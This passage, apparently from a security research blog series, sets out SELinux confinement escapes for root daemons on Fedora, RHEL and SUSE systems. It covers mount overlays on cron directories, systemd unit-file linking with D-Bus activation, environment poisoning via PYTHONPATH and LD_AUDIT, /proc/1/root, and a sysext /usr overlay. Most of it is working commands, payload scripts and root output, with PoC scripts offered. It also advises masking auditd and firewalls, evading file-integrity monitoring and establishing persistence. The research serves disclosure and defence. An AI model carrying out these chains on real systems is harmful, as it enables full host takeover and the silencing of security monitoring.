blk.AddConfigurationItem(item, {}, signature='(sa{sv})a{sv}')
#blk.RemoveConfigurationItem(item, {}, signature='(sa{sv})a{sv}')   # same item, same signature
```

Mount it:

```bash
$ id -Z
system_u:system_r:bluetooth_t:s0

$ busctl call org.freedesktop.UDisks2 /org/freedesktop/UDisks2/block_devices/loop0 \
      org.freedesktop.UDisks2.Filesystem Mount 'a{sv}' 0
s "/etc/cron.hourly"

$ ls -alZ /etc/cron.hourly/
drwxr-xr-x  3 root root ?                           1024 Jul 30 00:01 .
drwxr-xr-x. 1 root root system_u:object_r:etc_t:s0  5474 Jul 30 01:42 ..
-rwxr-xr-x  1 root root ?                             39 Jul 30 00:01 hourlyscript
drwx------  2 root root ?                          12288 Jul 29 23:17 lost+found

$ stat -c%C /etc/cron.hourly/hourlyscript 
system_u:object_r:bin_t:s0
```

ls shows `?` for SELinux because it checks `llistxattr()` output, sees the file has no xattrs and doesn't bother checking the actual type. Will go deeper on that in the detection/hardening post where it becomes relevant. It is cosmetic and has no impact on operation here, just an `ls` quirk. `stat -c%C` shows the true kernel view of the label via `getxattr("security.selinux")`.

That's it. Wait for the next /etc/cron.hourly run:

```bash
$ cat /tmp/mount.cron.id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:system_cronjob_t:s0-s0:c0.c1023
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
```

`AddConfigurationItem` is gated by `modify-device` (`active=yes`), `Mount` by `filesystem-fstab` (`auth_admin_keep`) - but same as the rest, uid-0 self-passes both.

`bluetooth_t` goes from being denied to create a loop device or mount a filesystem anywhere in several ways to being able to create a loop device from its own crafted file, mounted anywhere, with arbitrary mount flags, because of one SELinux attribute (`nsswitch_domain`) meant to allow bluetooth to do nss name lookups.

Note: the /etc/fstab entry is persistent, but the loop device is not. Establish persistence through another technique.

### Mount as Write

A mount is a method to write directories you can't actually write. SELinux and DAC guard the contents of a directory - `bluetooth_t` can't create a file in `/etc/cron.hourly` because SELinux typing. But mounting doesn't write into the directory, it shadows it. Use one of the mount techniques that uses an attacker filesystem and overlay it on top of a config directory a root process reads, or overlay it on top of directory it executes binaries from or reads libraries from. The files that process now sees are yours with no `create`/`write` on the target type at all.

The fstab `context=` option sets the files to any label the consuming domain expects. Or one that sets up a favorable transition on exec. The one requirement is that the consumer re-reads the directory at runtime rather than caching a view of it. Some examples:

| target | consumer behavior | overlay works? |
|---|---|---|
| `/etc/cron.d` | `crond` watches via inotify on the dir - a mount fires no event | no unless crond is restarted |
| `/etc/cron.hourly` | `run-parts` `readdir()`s the dir when the hourly job fires | yes |
| `/etc/logrotate.d` | `logrotate` re-reads the drop-in dir every run | yes |
| `/etc/sudoers.d` | `sudo` re-parses the drop-in dir on every invocation | yes |
| `/run/systemd/system` | systemd reads config at service load time, unloaded service configs can be replaced | yes |

`/etc/cron.d` is the interesting obvious thing to do with a write, but its inotify design complicates an overlay. Knowing which consumers `readdir()` and which cache is required.

Detecting and hardening is the topic of the next post so I won't go deep here but a mount overlay is not a config write. Most file-integrity and audit tooling watching for writes to `/etc/cron.*`, `/etc/sudoers.d`, `/etc/logrotate.d` see nothing - no `open(O_WRONLY)`, no new inode in the watched dir. The same thing working against us that prevents cron from seeing our file prevents security tooling from seeing the file.

## systemd

systemd is PID 1 running as `init_t` - the most privileged deputy on the box because it can become ~599 domains including `unconfined_service_t`. It launches every service, owns the on-disk unit-file state, and holds the environment block every process it spawns inherits. A confined daemon can't ask it to StartUnit directly - that call is SELinux-checked. But three things around it are not consistently checked:

- Unit-file mutation lacks the equivalent caller-domain service check
- Dependency activation has no originating D-Bus caller to check
- SetEnvironment is checked, but through the system:reload permission
 
Each one turns "I can send systemd a D-Bus message" into code execution as unconfined_service_t.

### unit-files

systemd D-Bus surface carries a lot of interesting methods as you would expect. Most carry an explicit `mac_selinux_access_check` - `bluetooth_t` trying to start a unit gets denied by SELinux, not polkit:

```bash
$ ausearch -m avc -ts recent | grep -i 'comm="dbus-broker"'

type=USER_AVC ... avc: denied { start } for ... scontext=system_u:system_r:bluetooth_t:s0
    tcontext=system_u:system_r:init_t:s0 tclass=service ...
```

The same denial is true for `Start`/`Stop`/`Kill`/`Restart`/`Reload`/`StartTransientUnit`. Note that these are all run-time functions though.

The methods that alter on-disk unit-file state do not carry those checks. Looking at every unit-file writer in `dbus-manager.c` and whether it makes a per-message SELinux check:

| MAC | Method | Functions |
|---|---|---|
| N | method_enable_unit_files_generic   | EnableUnitFiles, ReenableUnitFiles, LinkUnitFiles, PresetUnitFiles, MaskUnitFiles |
| N | method_preset_unit_files_with_mode | PresetUnitFilesWithMode |
| N | method_disable_unit_files_generic  | DisableUnitFiles (+ *WithFlags), UnmaskUnitFiles |
| N | method_revert_unit_files           | RevertUnitFiles |
| N | method_add_dependency_unit_files   | AddDependencyUnitFiles |
| Y | method_set_default_target          | SetDefaultTarget |
| Y | method_preset_all_unit_files       | PresetAllUnitFiles |

Five of the seven unit-file writer paths perform no SELinux authorization against the D-Bus caller. They consult polkit which we pass as uid 0, then PID 1 performs the requested filesystem changes under init_t. The two that carry `mac_selinux` are the system-wide (`SetDefaultTarget`, `PresetAllUnitFiles`) methods. Every writer that plants, links, masks, or reverts a specific unit does not. So a domain with zero service-class permissions can freely `Enable`, `Link`, `Mask`, `Disable`, `Unmask`, and `Revert` any unit on the system, gated by nothing but a polkit check uid 0 self-passes.

Three areas of impactful things we can do:

- **Start a unit as root.** `EnableUnitFiles` doesn't start anything directly. It writes the `WantedBy=` symlink. But an enabled unit is started by PID 1 as part of the boot transaction or as a dependency, and that path has no D-Bus caller, so `mac_selinux_unit_access_check` never runs. Drop a `.service` (via any write primitive above - into `/etc/systemd/system`, which auto-types `systemd_unit_file_t`, or point systemd at one anywhere with `LinkUnitFiles`, then `EnableUnitFiles`. Boot-persistence code execution, entirely below the SELinux line.
- **Disable defender services.** `MaskUnitFiles(["auditd.service","nftables.service"], runtime=false, force=true)` symlinks their `/etc/systemd/system` unit file to `/dev/null` persistently. auditd, the EDR, the firewall don't come back on the next start or reboot. No `start`/`stop` permission required - masking is a unit-file op.
- **Strip added hardening.** `RevertUnitFiles` reverts a unit to its vendor version, discarding customized hardening an admin may have done: a systemd override that added `ProtectSystem=`, `CapabilityBoundingSet`, a seccomp filter.

I will start with the most interesting: a confined uid‑0 daemon with zero `service`/`system` perms gets immediate unconfined_service_t.

### Want. Link. Enable

The first step is to write a systemd service file. This must be a type and path that `init_t` can read and that you can write. `bluetooth_t` and virtually every other root domain can write directly to `/run`. This is shown in more detail in the first post in the series measuring this. Briefly:

```bash
$ ls -dZ /run
system_u:object_r:var_run_t:s0 /run

$ sesearch -A -T -s bluetooth_t -t var_run_t -c file
type_transition bluetooth_t var_run_t:file bluetooth_var_run_t;

$ sesearch -A -s init_t -t bluetooth_var_run_t -c file -p read
allow init_t pidfile:file { ioctl lock map open read unlink };
```

Write the system service file to `/run/linnemanlabs-poc.service`:

```ini
[Unit]
Description=LinnemanLabs PoC

[Service]
Type=oneshot
ExecStart=/usr/bin/env sh -c 'id >/tmp/systemd.id;grep -E "^Cap(Eff|Bnd)" /proc/self/status >/tmp/systemd.status'

[Install]
WantedBy=passim.service
```

```bash
$ cat > /run/linnemanlabs-poc.service <<'EOF'
[Unit]
Description=LinnemanLabs PoC

[Service]
Type=oneshot
ExecStart=/usr/bin/env sh -c 'id >/tmp/systemd.id;grep -E "^Cap(Eff|Bnd)" /proc/self/status >/tmp/systemd.status'

[Install]
WantedBy=passim.service
EOF
```

`WantedBy=` is critical. You can not start your freshly-created unit (StartUnit is SELinux‑denied) but you can tell systemd that another service depends on you. And you can start a systemd service that is backing a D-Bus interface by sending a message to its D-Bus well-known name. So find a service that is not started, make it depend on you, start it.

You must select a service that is not loaded or else it already has its dependencies cached and would require a `systemd daemon-reload` that we cannot trigger. The confinement/caps of the target service do not matter, our service is independent and runs with our systemd unit file with full caps and no hardening applied.

Enumerate the D-Bus activated services, that are not currently loaded, that you have SELinux grants allowing you to reach. Script for enumerating reachable targets from a specific confined domain is available in the [Proofs of Concept](#proofs-of-concept):

```bash
$ ./cold-activatable-services.sh bluetooth_t
DBUS NAME                          UNIT                                       STATE  REACHABLE-BY-bluetooth_t
... trimmed unreachable
fi.w1.wpa_supplicant1              wpa_supplicant.service                     COLD   yes(NetworkManager_t)
org.bluez                          dbus-org.bluez.service                     COLD   yes(bluetooth_t)
org.freedesktop.fwupd              fwupd.service                              COLD   yes(fwupd_t)
org.freedesktop.realmd             realmd.service                             COLD   yes(realmd_t)
org.freedesktop.PackageKit         packagekit.service                         COLD   yes(rpm_t)
org.freedesktop.resolve1           dbus-org.freedesktop.resolve1.service      COLD   yes(systemd_resolved_t)
org.freedesktop.intel_lpmd         org.freedesktop.intel_lpmd.service         COLD   yes(unconfined_service_t)
org.freedesktop.portable1          dbus-org.freedesktop.portable1.service     COLD   yes(unconfined_service_t)
org.freedesktop.sysupdate1         dbus-org.freedesktop.sysupdate1.service    COLD   yes(unconfined_service_t)
org.freedesktop.thermald           dbus-org.freedesktop.thermald.service      COLD   yes(unconfined_service_t)
```

In the above linnemanlabs-poc.service file I chose passim. Right now all we have is a .service file sitting on disk - not a real, registered systemd service. By calling `LinkUnitFiles`:

```bash
$ id -Z
system_u:system_r:bluetooth_t:s0

$ busctl call org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager \
    LinkUnitFiles asbb 1 /run/linnemanlabs-poc.service false true
a(sss) 1 "symlink" "/etc/systemd/system/linnemanlabs-poc.service" "/run/linnemanlabs-poc.service"
```

systemd creates a symlink at `/etc/systemd/system/linnemanlabs-poc.service` -> `/run/linnemanlabs-poc.service`. That immediately makes `linnemanlabs-poc.service` a valid systemd service known by name with no `daemon-reload` required:

```bash
$ ls -la /etc/systemd/system/linnemanlabs-poc.service
lrwxrwxrwx. 1 root root 29 Jul 30 10:02 /etc/systemd/system/linnemanlabs-poc.service -> /run/linnemanlabs-poc.service

$ systemctl status linnemanlabs-poc.service
Warning: The unit file, source configuration file or drop-ins of linnemanlabs-poc.service changed on disk. Run 'systemctl daemon-reload' to reload units.
○ linnemanlabs-poc.service - LinnemanLabs PoC
     Loaded: loaded (/etc/systemd/system/linnemanlabs-poc.service; linked; preset: disabled)
    Drop-In: /usr/lib/systemd/system/service.d
             └─10-timeout-abort.conf
     Active: inactive (dead)
```

Interesting side note, that warning about daemon-reload does not impact us. It noticed a file has been updated since its last reload. The `passim` service we are adding ourselves as a dependency to has not been loaded and cached yet so no reload is required, the `passim` unit will get read fresh, the `wants` symlink will be seen, our service gets started. This is why we had to search for a service that has not yet been loaded a couple steps ago.

Service status is `linked`, now we need to enable it. Call `EnableUnitFiles`:

```bash
$ id -Z
system_u:system_r:bluetooth_t:s0

$ busctl call org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager \
    EnableUnitFiles asbb 1 /run/linnemanlabs-poc.service false true
ba(sss) true 1 "symlink" "/etc/systemd/system/passim.service.wants/linnemanlabs-poc.service" "/run/linnemanlabs-poc.service"

$ systemctl status linnemanlabs-poc.service | grep Loaded
     Loaded: loaded (/etc/systemd/system/linnemanlabs-poc.service; enabled; preset: disabled)
```

Now our service has updated to `enabled`. Due to the `[Install]` section of our `/run/linnemanlabs-poc.service` having the `WantedBy=passim.service` section, when we enable it systemd creates a symlink at `/etc/systemd/system/passim.service.wants/linnemanlabs-poc.service` -> `/run/linnemanlabs-poc.service`. passim now has a weak dependence on our service as far as systemd is concerned with no `daemon-reload` required since passim has not been loaded, which means its dependencies are not cached yet.

The last step is to connect to the D-Bus interface for `passim`, causing its service to start, triggering the dependencies to start which includes our `linnemanlabs-poc` service. A simple `dbus-ping`:

```bash
$ id -Z
system_u:system_r:bluetooth_t:s0

$ busctl call org.freedesktop.Passim / org.freedesktop.DBus.Peer Ping
```

Check the `linnemanlabs-poc` service status:

```bash
$ systemctl status linnemanlabs-poc
○ linnemanlabs-poc.service - LinnemanLabs PoC
     Loaded: loaded (/etc/systemd/system/linnemanlabs-poc.service; enabled; preset: disabled)
    Drop-In: /usr/lib/systemd/system/service.d
             └─10-timeout-abort.conf
     Active: inactive (dead) since Thu 2026-07-30 11:11:33 EDT; 58s ago
 Invocation: e979ca8e40c24b97b71aa6884bd25a83
    Process: 2897892 ExecStart=/usr/bin/env sh -c id > /tmp/systemd.id;grep -E "^Cap(Eff|Bnd)" /proc/self/status > /tmp/systemd.status (code=exited, status=0/SUCCESS)
   Main PID: 2897892 (code=exited, status=0/SUCCESS)
   Mem peak: 1.6M
        CPU: 9ms

Jul 30 11:11:33 fedora systemd[1]: Starting linnemanlabs-poc.service - LinnemanLabs PoC...
Jul 30 11:11:33 fedora systemd[1]: linnemanlabs-poc.service: Deactivated successfully.
Jul 30 11:11:33 fedora systemd[1]: Finished linnemanlabs-poc.service - LinnemanLabs PoC.
```

Check our output files from the PoC:

```bash
$ cat /tmp/systemd.id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0

$ cat /tmp/systemd.status 
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
```

Our service is running `ExecStart=/usr/bin/env ...` and `/usr/bin/env` is `bin_t`. PID 1 is `init_t`, so we get the same fallback transition: `init_t + bin_t` -> `unconfined_service_t`. If you were to use `ExecStart=/bin/sh ...` (which is labeled bin_t) the symlink to /bin/bash is followed, which is labeled `shell_exec_t` so when that transition fires you land in `initrc_t`.

Unconfined root with full caps. This technique is portable across all distros I tested on: Fedora, RHEL, openSUSE Leap, and SUSE SLES.

Quick recap of the flow:

| Step | What | Why |
|---|---|---|
| 1 | Write /run/x.service | prepare our service file |
| 2 | LinkUnitFiles | turn our file into a service |
| 3 | EnableUnitFiles | make another service depend on ours |
| 4 | dbus-ping | start the service that depends on ours |

[activation-pull.sh](#proofs-of-concept) PoC that runs this end-to-end:

```bash
$ id -Z
system_u:system_r:bluetooth_t:s0

$ bash activation-pull.sh
[*] cold pivot for WantedBy chose dbus-org.freedesktop.sysupdate1.service
[*] writing unit to /run/linnemanlabs-poc-1786468876133716.service
[*] linking /run/linnemanlabs-poc-1786468876133716.service to create known unit
a(sss) 1 "symlink" "/etc/systemd/system/linnemanlabs-poc-1786468876133716.service" "/run/linnemanlabs-poc-1786468876133716.service"
[+] linked /run/linnemanlabs-poc-1786468876133716.service
[*] enabling unit to create .wants link
ba(sss) true 1 "symlink" "/etc/systemd/system/dbus-org.freedesktop.sysupdate1.service.wants/linnemanlabs-poc-1786468876133716.service" "/run/linnemanlabs-poc-1786468876133716.service"
[+] enabled - dbus-org.freedesktop.sysupdate1.service now weakly depends on us
[*] pinging org.freedesktop.sysupdate1 to activate our dependency
[+] activated org.freedesktop.sysupdate1 - check /tmp/service.out-1786468876133716
[*] cleaning up - unlinking our service and deleting unit file
a(sss) 2 "unlink" "/etc/systemd/system/linnemanlabs-poc-1786468876133716.service" "" "unlink" "/etc/systemd/system/dbus-org.freedesktop.sysupdate1.service.wants/linnemanlabs-poc-1786468876133716.service" ""
[+] cleanup done. systemd caches the Wants= until next daemon-reload
[*] to remove now: sudo systemctl daemon-reload
[*] if svc running: sudo systemctl stop dbus-org.freedesktop.sysupdate1.service
```

Then check from the host:

```bash
$ cat /tmp/service.out-1786468876133716
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
CapInh: 0000000000000000
CapPrm: 000001ffffffffff
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000
```

#### Clean-up

The persistent `.wants` symlink survives reboot, but our .service target we placed under /run is a tmpfs and does not. `systemctl disable <service>` will remove the dependency symlink and the linked unit file. A daemon-reload after will clear cache states.

### Env Poisoning

#### Summary

systemd also provides a `SetEnvironment` method on the manager. The freedesktop docs explain it well: "SetEnvironment() may be used to alter the environment block that is passed to all spawned processes."

There are three gates to accessing this method:

- SELinux: `allow ... init_t:system reload;` - systemd's `method_set_environment` calls `mac_selinux_access_check(msg,"reload")`. The `reload` bit granted for daemon-reloads authorizes global-env poisoning.
- SELinux: `allow ... init_t:dbus send_msg;` - to deliver the message to the systemd D-Bus interface.
- polkit: action `org.freedesktop.systemd1.set-environment` - uid-0 self-passes.

Polkit self-passes as uid-0. 81 rules (including the same `nsswitch_domain`) we have been using covering 342 confined daemons provide a grant for `init_t:dbus send_msg`. `init_t:system reload` is the remaining constraint. Enumerate the membership you will see 31 total domains have the grant. A few notable members:

```
$ sesearch -A -t init_t -c system -p reload
( ... snipped 27 more domains that are all interesting )
allow NetworkManager_t init_t:system reload;
allow dhcpc_t init_t:system reload;
allow ipsec_mgmt_t init_t:system reload;
allow logrotate_t init_t:system reload;
```

If you can exec from a daemon in those domains it can chain into this. I recently found a vulnerability in nm-l2tp that leads to code-exec as root but confined into the `ipsec_mgmt_t` domain. That confined domain can now poison the environment for all systemd spawned processes.

`logrotate` is a notable member. It turns an `etc_t` file write grant into root code exec as `logrotate_t`. Now, chain that confined code-exec into systemd environment poisoning -> unconfined exec.

The priority order for overriding these environment variables is manager-global (this poison) -> unit Environment= -> systemd runtime vars. So our variables can be overridden by a later unit file that does `UnsetEnvironment=` or overrides one of our exact variables.

There are a large number of techniques to turn environment control into code exec. The three classes I developed PoC's for here:

- `LD_AUDIT`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `GCONV_PATH` - get a normal ELF binary to load your module.
- `Interpreter class` - `PYTHONPATH` + a sitecustomize.py, `BASH_ENV` (shell wrappers), `NODE_OPTIONS`=--require, `JAVA_TOOL_OPTIONS`=-javaagent.
- `PATH` - our path gets passed in directly. Place a binary of the same name as any that will get executed.

The LD_* class works because init_t carries `noatsecure` to its children (root services only). The interpreter class doesn't rely on `AT_SECURE` and generally checks for euid != uid which passes for a root service.

```bash
$ sesearch -A -s init_t -c process -p noatsecure
allow init_t domain:process { getattr getpgid noatsecure rlimitinh setrlimit setsched sigchld sigkill signal signull sigstop };
```

#### Step-By-Step

I will walk through this from the `logrotate_t` domain. Gaining execution via logrotate is covered in another section. From the logrotate_t domain, I will use the `PYTHONPATH` route but PoCs for each are on my GitHub. First, create a python script:

```bash
$ id -Z
system_u:system_r:logrotate_t:s0

cat > /var/lib/logrotate/sitecustomize.py <<'EOF'
#!/usr/bin/env python3
import os, subprocess
id = subprocess.run("id", capture_output=True, text=True)
status = open('/proc/self/status').read().strip()
open('/proc/1/root/tmp/env.py.status','w').write("poisoned-env py ran\n\n%s\n%s\n" % (id.stdout,status))
EOF
```

Now we call `systemd1.Manager.SetEnvironment` to tell systemd that every spawned process should have the poisoned `PYTHONPATH=/var/lib/logrotate` env var:

```bash
$ id -Z
system_u:system_r:logrotate_t:s0

$ busctl call org.freedesktop.systemd1 /org/freedesktop/systemd1 \
    org.freedesktop.systemd1.Manager SetEnvironment as 1 "PYTHONPATH=/var/lib/logrotate"
```

Confirm it is active:

```bash
$ systemctl show-environment | grep PYTHONPATH
PYTHONPATH=/var/lib/logrotate
```

Start/Re-Start a service backed by a python script, it runs with PYTHONPATH, checks for $PYTHONPATH/sitecustomize.py, runs our python script. Enumerate them on your box or use a different technique like LD_AUDIT or PATH. I am using `tuned` here:

```bash
$ id -Z
system_u:system_r:logrotate_t:s0

$ busctl call org.freedesktop.systemd1 /org/freedesktop/systemd1 \
    org.freedesktop.systemd1.Manager RestartUnit ss tuned.service replace
o "/org/freedesktop/systemd1/job/1131748"
```

Check our /tmp/env.py.status output file:

```bash
$ cat /tmp/env.py.status 
poisoned-env py ran

uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0

Name:   tuned
...
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
```

Unconfined root with full caps from `etc_t` file write.

The poisoned environment is inherited by later PID-1-spawned processes - service restarts, timers, user logins, etc. The `PYTHONPATH` payload only executes when a Python consumer starts. The `LD_AUDIT`/`LD_PRELOAD`/`PATH` approaches are simpler and fire on more daemons.

As always, proof of concept available at end of article. From build host:

```bash
$ MODE=build ./env-poison.sh
CMD: { id; grep ^Cap /proc/self/status; } > /proc/1/root/tmp/env.out
[+] built ./env-poison-audit.so
    put it on the target in a dir the target can map then run there:
    AUDIT_SO=<path-on-target> [TARGET=<svc>] ./env-poison.sh
```

Transfer the .so to target. From confined target:

```bash
$ id -Z
system_u:system_r:logrotate_t:s0

$ AUDIT_SO=/var/lib/logrotate/env-poison-audit.so bash /var/lib/logrotate/env-poison.sh
[*] mode=fire method=ld_audit target=uresourced.service poison=LD_AUDIT
[*] setting global environment variable
[+] set LD_AUDIT=/var/lib/logrotate/env-poison-audit.so in PID 1 global env
[*] restarting service uresourced.service
o "/org/freedesktop/systemd1/job/94743"
[*] restarted uresourced.service, giving it 6s to fork+fire, then unpoisoning...
[+] done - check /proc/1/root/tmp/env.out for the payload output (as the target's domain+uid)
[*] cleanup: unset LD_AUDIT in PID 1 env, removed staged files
```

From the main filesystem namespace:

```bash
$ cat /tmp/env.out 
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
CapInh: 0000000000000000
CapPrm: 000001ffffffffff
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000
```

#### Clean-up

To remove the env var:

```bash
$ busctl call org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager UnsetEnvironment as 1 PYTHONPATH
```

#### Prior Art

I found a post from Jann Horn all the way back in a 2018 [AppArmor report](https://bugs.launchpad.net/ubuntu/+source/apparmor/+bug/1788929) where he clearly recognized the impact of SetEnvironment from an attacker perspective. My contribution is the SELinux/system-manager reachability analysis and application to escaping those domains.

### /proc/1/root

systemd's filesystem hardening (`PrivateTmp=`, `ProtectSystem=`, `ProtectHome=`, `PrivateDevices=`) all work the same way: they put the service in a private mount namespace with a different view of the filesystem. A private /tmp, a read-only /usr, an empty /home. PID 1 is not in that namespace. It sits in the host's, with the real mounts.

`/proc/1/root` is a `magic link` symlink to PID 1's root directory. Follow it and you're looking at the real filesystem - the real /tmp, the writable /etc, the real /var, outside of your own sandbox. `ProtectSystem=strict` only made your `/etc` read-only, `/proc/1/root/etc` is not.

The important limit is that this bypasses the namespace, not the label. SELinux still type-checks everything you reach through the link against your own domain. `/proc/1/root/etc/shadow` still needs shadow_t:file read, and `bluetooth_t` still doesn't have it. It defeats systemd's mount-based sandbox, not SELinux type enforcement. Which is why it's an enabling technique rather than an escape on its own.

To reach it you need two things: `CAP_SYS_PTRACE` (uid 0 alone isn't enough - PID 1 isn't ptrace-accessible without it, and the SELinux read check. Following the magic link is `PTRACE_MODE_READ`, so SELinux checks `<domain> init_t:file read` - not `init_t:process ptrace`. That process-class check only fires for attach-mode operations (`/proc/pid/mem`, `process_vm_writev`), which stay denied. 229 confined domains hold the file:read half, against ~297 for the fleet. Still a very large set. This is one of the few techniques `bluetooth_t`, my running example, cannot use - it doesn't have `CAP_SYS_PTRACE` or the read grant.

A domain that can reach it gets the real filesystem to stage into or read from, past its own sandbox: deliver a payload to the real /tmp for an unconfined consumer to pick up without PrivateTmp hiding it, or to /var without ProtectSystem making it read-only, or drop a result somewhere you can actually retrieve it like in the environment-poisoning proof earlier. The limit is the normal filesystem labels.

`/proc/<pid>/root` works for any mount namespace whose process you can `ptrace-read`. PID 1's is just the most useful, because it's the host. Reaching other namespaces - containers, another service's private mounts - through other processes and the gates to it gets deep and may be a separate future post.

A large number of daemons retain CAP_SYS_PTRACE while setting various protections like PrivateTmp and ProtectSystem, this is worth checking on your target.

#### Prior Art

`/proc/<pid>/root` is a longstanding Linux magic link that resolves paths through the target process's filesystem view, including its mount namespace. If the confined service remains in the host PID namespace, PID 1 provides a particularly useful view outside the service's private mount namespace. This technique has been applied to at least container escapes.

## Varlink

systemd is quietly moving IPC onto varlink - `io.systemd.Manager`, `io.systemd.Login`, `io.systemd.UserDatabase`, `io.systemd.Home`, `io.systemd.Credentials`, a set that grows every release.

Varlink socket connections are gated on the following for a uid-0 foothold:
- `unix_stream_socket connectto` on the listener's domain (the process listening)
- `sock_file write` on the socket file's label
- `dir-search` on each directory in the path to the socket

There is no `varlink:send_msg` class in SELinux. A varlink service is a plain `AF_UNIX` socket. Once a client `connectto`s it, the traffic is raw socket read/write. The only per-operation SELinux check is one the handler makes explicitly, via a `mac_selinux_access_check_varlink()` call inside the method. I counted those calls across every varlink handler in systemd 259.7:

```bash
3  src/core/varlink-unit.c src/core/varlink-manager.c
0  src/home/homed-varlink.c
0  src/machine/machined-varlink.c
0  src/login/logind-varlink.c
0  src/resolve/resolved-varlink.c
0  src/shared/varlink-io.systemd.UserDatabase.c
```

The manager checks SELinux permissions, the others do not.

For the sockets I am going to use in this section, these are the listener and socket labels:

| varlink | socket label | listener -> connectto target |
| --- | --- | --- |
| sysext, Repart, Manager | init_var_run_t | init_t |
| Login | systemd_logind_var_run_t | systemd_logind_t |
| userdb (Multiplexer) | systemd_userdbd_runtime_t | systemd_userdbd_t |

The reach into them is large:

| varlink (method) | reachable by | method SELinux-gated? | result |
| --- | --- | --- | --- |
| io.systemd.sysext.Merge | ~206 | no | /usr overlay -> escape |
| io.systemd.Repart.Run | ~586 | no | arbitrary read / image build |
| io.systemd.Manager.* (unit ops) | ~586 | yes (mac_selinux_access_check) | walled |
| io.systemd.UserDatabase.GetUserRecord | ~612 | not SELinux, uses SO_PEERCRED/uid | root hash read |

Looking at the `init_var_run_t` sockets, the grants come from attributes that almost every daemon carries:

| gate (init_var_run_t sockets) | granted via attributes | domains carrying |
| --- | --- | --- |
| sock_file write on init_var_run_t | daemon (+ files_unconfined_type, system_bus_type, admin/user types, few named types) | 586 |
| connectto init_t:unix_stream_socket | nsswitch_domain, daemon, system_bus_type, unconfined_domain_type, and systemctl_domain | 782 |
| both -> can reach the socket | - | 586 |

~782 domains can `connectto` `init_t` through these attributes. 586 of those also hold `sock_file` `write` on `init_var_run_t` which means they can reach the PID1 varlinks. That write comes from a few attributes but the largest is daemon (503) but also files_unconfined_type, the user/admin session types, and system_bus_type. The ~196 that can connect but not write are almost all short-lived helper and user-transition domains (abrt_helper_t, chronyc_t, chkpwd_t, crontab_t, ...), not full daemons. So for a compromised daemon, connect reach is effectively universal.

### sysext Overlay

sysext is designed for image-based/immutable OSes that ship with `/usr` read-only to let you overlay removable, versioned images after boot. The varlink socket was introduced in systemd >= 255, which all of my tests systems run except RHEL9 which uses 252.

The varlink socket at `/run/systemd/io.systemd.sysext` for managing these overlays provides a `Merge` method that will overlay anything in `/usr` or `/opt` or their subdirectories. The overlay is mounted `ro,nodev` but not `nosuid` and preserves the original files SELinux label and permissions we control.

Overlay an existing binary, give it a favorable label for transition, the next time the system attempts to execute the binary at that path it will be our attacker-supplied binary instead.

Or overwrite /usr/systemd/ and modify unit files, or overwrite polkit or d-bus policies, or drop an SUID binary. On merged-usr systems /bin is a symlink to /usr/bin, so /bin is covered too. Too many options to list.

#### Setup

sysext requires files be staged in `/var/lib/extensions (var_lib_t)`, `/run/extensions (var_run_t)`, `/etc/extensions (etc_t)` or `/usr/lib/extensions, /usr/local/lib/extensions (lib_t)`. Limiting for a confined domain, but `/run/extensions (var_run_t)` is reachable by daemons that write /run. sysext does follow symlinks which opens many routes also. Many grants are only to create files however, not directories, and these directories don't exist by default.

The majority of daemons have a transition from `var_run_t` to a daemon-specific type like `ipsec_var_run_t`, but they are per-daemon not an attribute. The two domains I have been using in the rest of this article (`bluetooth_t` and `logrotate_t`) are walled off from this path due to lacking `:dir create` permissions. `bluetooth_t` is one of ~129 domains that can actually write the required files if the /run/extensions directory is already created, but cannot create the /run/extensions directory.

I will use `ipsec_mgmt_t` for this example - the domain you get dropped in from a recent `nm-l2tp` vulnerability I found. ~206 domains can drive this end-to-end on their own. ~129 domains can drive this but cannot create the `extensions` directory - so if it already exists (or they can recruit something to create it) they can.

#### End-To-End

At a high level the process is:
- create image off-box containing crafted filesystem
- create `/run/extensions` directory on target
- place crafted image inside /run/extensions
- call Varlink to Merge, which overlays our image on top of /usr
- call inactive D-Bus service that runs the binary we overlaid in /usr

For this example, I will be overlaying /usr to place a crafted binary that backs a systemd service that is D-Bus activated. When we call that D-Bus service, our binary executes in the desired domain. I will use `realmd` in this example since it is portable across the RHEL/Fedora family. When choosing a daemon the normal SELinux domain does not matter since you are labeling the binary yourself and `init_t` transitions to it, but you will want to choose a service that runs with minimal systemd confinement as that is still applied to your process. `sudo busctl --system -l --activatable` will enumerate many options for you.

By also overlaying the services systemd unit file this allows us to remove any systemd restrictions normally on that service. We can remove `ProtectSystem`, `CapabilityBoundingSet`, `PrivateTmp`, etc to get our binary with our SELinux label ran with no systemd sandboxing.

First, create the `/run/extensions` directory. Then we need to create an image with our desired files. We can replace any file on the system. Then we merge that image onto the filesystem. For this example, I will overlay a binary that an inactive and unconfined service executes. When we call that service over D-Bus, systemd will execute our binary.

sysext consumes three forms: a directory, a bare-fs .raw, or a GPT DDI. I will craft a .raw image for this example. I will do this off-site so we can apply the correct SELinux labels we want. 

On a machine you have full root on:

```bash
cat > payload.sh <<'EOF'
#!/bin/bash
cat /proc/self/status > /tmp/sysext.status
id > /tmp/sysext.id
EOF

dd if=/dev/zero of=linnemanlabs-poc.raw bs=1000000 count=8

mkfs.ext4 linnemanlabs-poc.raw

TMPMNT=$(mktemp -d); mount -o loop linnemanlabs-poc.raw "$TMPMNT"

mkdir -p "$TMPMNT/usr/libexec" "$TMPMNT/usr/lib/extension-release.d"

install -m0755 payload.sh "$TMPMNT/usr/libexec/realmd"

chcon -t bin_t "$TMPMNT/usr/libexec/realmd"

printf "ID=_any\n" > "$TMPMNT/usr/lib/extension-release.d/extension-release.linnemanlabs-poc"

umount "$TMPMNT"; rmdir "$TMPMNT"
```

